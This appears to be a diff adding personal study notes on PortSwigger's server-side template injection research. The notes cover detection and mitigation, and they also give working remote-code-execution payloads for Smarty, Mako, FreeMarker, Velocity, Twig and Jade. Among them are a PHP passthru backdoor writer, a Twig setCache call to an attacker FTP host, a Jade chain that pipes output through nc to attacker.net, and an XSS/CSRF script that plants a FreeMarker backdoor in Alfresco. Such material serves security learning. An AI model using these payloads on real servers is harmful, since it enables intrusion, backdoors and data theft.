@@ -1,0 +1,284 @@
+https://portswigger.net/research/server-side-template-injection
+
+SSTI:
+- Unsafe embedding user input in templates enable SSTI attack
+- Directly attack web server internal and often obtain RCE, turning every vulnerable application into a potential pivot point
+
+Introduction:
+- Frequently use template system: Twig, FreeMarker
+- Example:
+    + Safe: $output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) ); 
+    + Vuln: $output = $twig->render($_GET['custom_email'], array("first_name" => $user.first_name) );
+
+    + {{7*7}} --> 49
+    + {{self}} --> Object of class __TwigTemplate_7ae62e582f8a35e5ea6cc639800ecf15b96c0d6f78db3538221c1145580ca4a5 could not be converted to string
+
+- LFI: (Local File Include)
+    + Session file: https://www.ush.it/2008/07/09/local-file-inclusion-lfi-of-session-files-to-root-escalation/
+    + /proc/self/env: https://www.ush.it/2008/08/18/lfi2rce-local-file-inclusion-to-remote-code-execution-advanced-exploitation-proc-shortcuts/
+
+
+Template Injection methodology:
+- Detect -> Identify -> Exploit (Read, Explore, Attack)
+- Identify: https://portswigger.net/cms/images/migration/blog/screen-shot-2015-07-20-at-09-21-56.png
+    + Example of different response:
+        + {{7*'7'}} = 49 (Twig)
+        + {{7*'7'}} = 7777777 (Jinja2)
+- Read:
+    + First step after identify is read the document: (find attack vector)
+        + For template author - basic syntax
+        + Security considerations - chances dev didn't read this and use vuln function
+        + Builtin method, functions, filters, variables - example __class__, __mro__, config (Jinja2), _self, _context (Twig)
+        + List of extension/plugins - some maybe enable by default
+- Explore:
+    + Assuming no exploit have presented, next step is explore enviroment to find what you have access to
+    + Many template expose 'self' or namespace object contain everything in scope
+    + If there no builtin 'self', you have to bruteforce variables name via wordlist crawling Github for GET/POST in PHP
+        https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt
+- Attack:
+
+
+Exploit development:
+- Smarty: {php}echo `id`;{/php}
+- Mako: 
+    <% import os; x=os.popen('id').read() %> ${x}
+    ${__import__('os').popen('id').read()}
+    ${__import__('subprocess').check_output('id',shell=True)}
+    ${os.popen('id').read()} (if os already import in context)
+- Many template try to prevent app logic by restricting their ability to execute arbitrary code. Other try to restrict and sandbox template as security measure. 
+-> In this case, developing backdoor can prove quite a challenging process
+
+
+FreeMarker:
+- Popular template engine in Java
+- FAQ: http://freemarker.org/docs/app_faq.html#faq_template_uploading_security
+- Payload:
+    <#assign ex="freemarker.template.utility.Execute"?new()>
+    ${ ex("id") }
+- Analysis payload:
+    + {class_name}?new(): allow create any Java class from template
+    + freemarker.template.utility.Execute: fork 1 process of OS and return stdout
+- How to prevent:
+    + Suggest:
+        // block all ?new()
+        configuration.setNewBuiltinClassResolver(
+            TemplateClassResolver.ALLOWS_NOTHING_RESOLVER
+        );
+
+
+Velocity:
+- Another popular Java teplate language, but tricker to exploit
+- There is no 'Security Considerations' page to point out dangerous function, and also no list of default variables
+- Using burp intruder to bruteforce variable name
+    https://portswigger.net/cms/images/migration/blog/1-variable-bruteforce.png
+- Class variable look particularly promising because it return a generic Object
+- ClassTool: tool meant to use Java reflection in templates
+  default key: $class
+
+  $class.inspect("name.class") -> return new ClassTool instance wrapping that class
+  $class.type -> return actual Class being inspected
+  $class.inspect("java.lang.Runtime").type -> return Class<RunTime> -> can call .getRunTime()
+  
+- Payload:
+    + Time delay: $class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()
+    + Read output:
+    #set($str=$class.inspect("java.lang.String").type)
+    #set($chr=$class.inspect("java.lang.Character").type)
+    #set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
+    $ex.waitFor()
+    #set($out=$ex.getInputStream())
+    #foreach($i in [1..$out.available()])
+    $str.valueOf($chr.toChars($out.read()))
+    #end
+
+
+Smarty:
+- One of the most popular PHP template language, offers a secure mode for untrusted template
+    https://www.smarty.net/docs/en/advanced.features.tpl#advanced.features.security
+- This enforces a whitelist of safe PHP function, can't directly invoke system()
+- But document reveal that $smarty builtin var can used to access enviroment var, include location of current file $SCRIPT_NAME
+    {$smarty.server.SCRIPT_NAME} -> current file path
+    {$smarty.env.PATH} -> env var
+- By bruteforce, reveal self object reference to current template
+    https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_data.php#L385
+    {self::getStreamVariable("file:///proc/self/loginuid")} -> 1000
+    {self::getStreamVariable($SCRIPT_NAME)} -> <?php define("SMARTY_DIR",'/usr/share/php/Smarty/'); require_once(SMARTY_DIR.'Smarty.class.php');
+- Further more, we can call arbitrary static method through Smarty_Internal_Write_File:writeFile()
+    public function writeFile($_filepath, $_contents, Smarty $smarty)
+    + The last param has a Smarty type hint, so will reject any non-Smarty type
+    -> Need to obtain a reference to a Smarty object
+- Code also reveal that self:clearConfig() method is suitable
+    public function clearConfig($varname = null)
+    {
+        return Smarty_Internal_Extension_Config::clearConfig($this, $varname);
+    }
+    + $this is Smart instance
+- Final payload designed to overwrite vuln file with backdoor:
+    {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+
+
+Twig:
+- Another popular PHP template language
+- Has restriction similar to Smarty's secure mode by default and couple of additional limit
+    + It isn't possible to call static method and return value are cast to string
+    -> Can't use function to object object reference
+- Unlike Smarty, Twig has documented its self object (_self) -> don't need bruteforce var
+- The _self doesn't contain any useful method, but have an env attribute refer to Twig enviroment object
+    https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php
+    + _self.env is attribute -> not return value -> not cast to string -> still object reference
+- The setCache method can used to change the location Twig tries to load and execute compiled templates (PHP files)
+    {{_self.env.setCache("ftp://attacker.net:2121")}}
+    {{_self.env.loadTemplate("backdoor")}}
+    + Twig compile from cache location -> setCache to attacker's server -> load and execute malicious PHP
+    + But modern version disable inclusion of remote file by default via allow_url_include
+        https://www.php.net/manual/en/filesystem.configuration.php
+- Further more, code review reveals a call to dangerous call_user_func() on line 874, in getFilter() method
+    https://www.php.net/manual/en/function.call-user-func.php
+    https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L874
+
+    {{_self.env.registerUndefinedFilterCallback("exec")}} -> $this->filterCallbacks = ["exec"]
+    {{_self.env.getFilter("id")}} -> call_user_func("exec", "id")
+    + It still work although Twig cast return string, because exec() also return string
+
+
+Twig (sandboxed):
+- Additional restriction to Twig
+    + Disable attribute retrieval and adds a whitelist of function and method call
+    -> By default we can't call any function, even method on a developer-supplied object
+    -> Make exploitation pretty much impossible
+- But the source code tell a different story
+    https://github.com/twigphp/Twig/blob/d63ac2088e8d30137cde10f310ab89b06dab916b/lib/Twig/Sandbox/SecurityPolicy.php#L83
+    if ($obj instanceof Twig_TemplateInterface || $obj instanceof Twig_Markup) {
+        return true;
+    }
+    + Any object Twig_TemplateInterface are allowed without whitelist, include _self
+
+    https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Template.php#L139
+    public function displayBlock($name, array $context, array $blocks = array(), $useBlocks = true) {
+        $name = (string) $name;
+        if ($useBlocks && isset($blocks[$name])) {
+            $template = $blocks[$name][0];
+            $block = $blocks[$name][1];
+        } elseif (isset($this->blocks[$name])) {
+            $template = $this->blocks[$name][0];
+            $block = $this->blocks[$name][1];
+        } else {
+            $template = null;
+            $block = null;
+        }
+        if (null !== $template) {
+            try {
+                $template->$block($context, $blocks);
+            } catch (Twig_Error $e) {
+                .....
+            }
+        }
+    }
+
+    + The displayBlock() method offer a high-level gadget
+        $template->$block($context, $blocks);
+        + This can bypass whitelist and call any method on any object the user can obtain a reference to
+
+    {{_self.displayBlock("id",[],{"id":[userObject,"vulnerableMethod"]})}}
+    + Invoke the vulnerableMethod method on the userObject object, with no arguments
+    + Analysis:
+        + $name = "id"
+        + $blocks["id"] exist -->   $template = userObject
+                                    $block = "vulnerableMethod"
+        + $template->$block($context, $blocks) -->  userObject->vulnerableMethod($context, $blocks)
+
+- This can't used to exploit Twig_Enviroment->getFilter() method, because there is no way to obtain a reference to Enviroment object
+- However, we can invoke method on any object developer has passed into template - the _context oject attribute can be iterated over to see if anything useful in scope
+
+
+Jade:
+- Popular Node.js template engine
+- Blackbox exploit step in CodePen.io:
+    + Confirm template execution: = 7*7   -> 49
+    + Locate the self object: = root  -> [object global]
+    + Find a way to list object properties and functions:
+        - var x = root
+        - for(var prop in x)
+            , #{prop}
+
+        , ArrayBuffer, Int8Array, Uint8Array, Uint8ClampedArray... global, process, GLOBAL, root
+    + Explore promising objects:
+        - var x = root.process
+        - for(var prop in x)
+            , #{prop}
+
+        , title, version, moduleLoadList... mainModule, setMaxListeners, emit, once
+    + Bypass trivial countermeasures:
+        - var x = root.process.mainModule
+        - for(var prop in x)
+            , #{prop}
+    + If blocked by filter, try to split mainModule to another line
+        - var x = root.process
+        - x = x.mainModule
+        - for(var prop in x)
+            , #{prop}
+
+        , id, exports, parent, filename, loaded, children, paths, load, require, _compile 
+    + Confirm if require work: (message output to identify)
+        - var x = root.process
+        - x = x.mainModule.require
+        - x('a')
+
+        Cannot find module 'a' 
+    + Exploit:
+        - var x = root.process
+        - x = x.mainModule.require
+        - x = x('child_process')
+        = x.exec('id | nc attacker.net 80')
+
+- Lesson from blacklist/filter:
+    + If using keywork blacklist, we can bypass by split line or bracket notation (root['pro'+'cess'])
+    + Should use whitelist instead of blacklist
+- Lesson from Node.js:
+    + global.process.mainModule.require: this is traditional gadget chain in Node.js SSTI
+    + child_process: dangerous module, can allow spawn shell directly
+
+
+Case study: Alfresco
+- Alfresco is a CMS (content management system) aimed at corporate users
+- Low privilege users can chain a stored XSS vuln in comment system with FreeMarker template injection to gain shell
+- We can use payload FreeMarker above but expanded into a classic backdoor that execute content of query string as shell command:
+    <#assign ex="freemarker.template.utility.Execute"?new()> 
+    ${ ex(url.getArgs()) }
+- Users do not have permission to edit template, but stored XSS can used to force admin install our backdoor for us
+- Inject this JS to launch attack:
+    tok = /Alfresco-CSRFToken=([^;]*)/.exec(document.cookie)[1];
+    tok = decodeURIComponent(tok)
+    do_csrf = new XMLHttpRequest();
+    do_csrf.open("POST","http://"+document.domain+":8080/share/proxy/alfresco/api/node/workspace​/SpacesStore/59d3cbdc-70cb-419e-a325-759a4c307304/formprocessor",false);
+    do_csrf.setRequestHeader('Content-Type','application/json; charset=UTF-8');
+    do_csrf.setRequestHeader('Alfresco-CSRFToken',tok);
+    do_csrf.send('{"prop_cm_name":"folder.get.html.ftl","prop_cm_content":"&lgt;#assign ex=\\"freemarker.template.utility.Execute\\"?new()> ${ ex(url.getArgs())}","prop_cm_description":""}');
+
+- Note:
+    + According to Alfresco's document, SELinux will do nothing to confine resulting shell
+        "If installed Alfresco using setup wizard, alfresco.sh script included disable the Security-Enhanced Linux(SELinux) feature across the system"
+
+
+Case study: XWiki Enterprise
+- Feature-rich professional wiki
+- https://www.xwiki.org/xwiki/bin/view/Main/WebHome
+- User can register and edit wiki pages, which contain Velocity template code
+- However, generic payload will not work, the $class help is not available
+- Read more in research
+
+
+Mitigations - templating safely:
+- Regexes are not an effective defense, and parser-level sandboxes are error prone
+- Lowest risk approach is use trivial template engine such as Mustache, Python's template
+- Another way is to concede that arbitrary code execution is inevitable and sandbox it inside locked-down Docker container
+
+
+Issue status:
+- Author do not consider exploit shown from framework above is vuln in those languages (same as sql injection is not fault of MySQL)
+
+
+Conclusion:
+- SSTI only apparent to auditors who explicitly look for it
+- Template engines are server-side sandboxes, it allowed untrusted users to edit template, introduces an array of serious risks, which may not be evident in template system's document
+- Many modern technologies designed to prevent SSTI from doing harm are currently immature and should not be relied on except as a defense in depth measure
